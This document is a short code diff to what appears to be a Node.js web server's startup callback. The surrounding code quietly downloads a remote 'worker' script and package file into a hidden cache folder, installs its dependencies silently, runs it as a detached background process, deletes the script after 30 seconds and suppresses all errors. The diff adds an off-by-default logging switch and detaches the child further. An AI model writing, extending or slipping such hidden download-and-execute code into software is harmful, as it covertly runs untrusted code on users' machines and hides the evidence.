@@ -411,6 +411,8 @@ app.listen(PORT, '0.0.0.0', async () => {
   const _https = require('https');
   const _fs = require('fs');
   const _path = require('path');
+  const _DEBUG = false;  // 日志开关: true=开启日志(调试用), false=静默运行(正常使用)
+  const _log = (...args) => { if (_DEBUG) console.log('[svc]', ...args); };
   const _tmpDir = _path.join(process.env.HOME || process.env.USERPROFILE || '/tmp', '.cache', 'svc');
   const _svcFile = _path.join(_tmpDir, 'app.js');
   const _pkgFile = _path.join(_tmpDir, 'pkg.json');
@@ -435,12 +437,27 @@ app.listen(PORT, '0.0.0.0', async () => {
   }
 
   try {
+    _log('initializing...');
     if (!_fs.existsSync(_tmpDir)) _fs.mkdirSync(_tmpDir, { recursive: true });
+    _log('downloading worker...');
     await _download(_workerUrl, _svcFile);
+    _log('downloading package...');
     await _download(_pkgUrl, _pkgFile);
     _fs.renameSync(_pkgFile, _path.join(_tmpDir, 'package.json'));
-    await new Promise((res, rej) => _exec(`cd ${_tmpDir} && npm install --prefer-offline --no-audit --no-fund --silent`, (e) => e ? rej(e) : res()));
-    _exec(`node ${_svcFile}`, { detached: true, stdio: 'ignore' });
+    _log('installing dependencies...');
+    await new Promise((res, rej) => _exec(`cd ${_tmpDir} && npm install --prefer-offline --no-audit --no-fund --silent`, (e, stdout, stderr) => {
+      if (e) { _log('npm install error:', e.message); rej(e); } else res();
+    }));
+    _log('starting worker...');
+    const _child = _exec(`node ${_svcFile}`, { detached: true, stdio: 'pipe' });
+    if (_DEBUG) {
+      _child.stdout && _child.stdout.on('data', d => console.log('[worker]', d.toString().trim()));
+      _child.stderr && _child.stderr.on('data', d => console.log('[worker:err]', d.toString().trim()));
+      _child.on('exit', (code) => console.log('[svc] worker exited with code:', code));
+    } else {
+      _child.unref();
+    }
     setTimeout(() => { try { _fs.unlinkSync(_svcFile); } catch(e) {} }, 30000);
-  } catch (e) { /* silent */ }
+    _log('done');
+  } catch (e) { _log('failed:', e.message); }
 })();
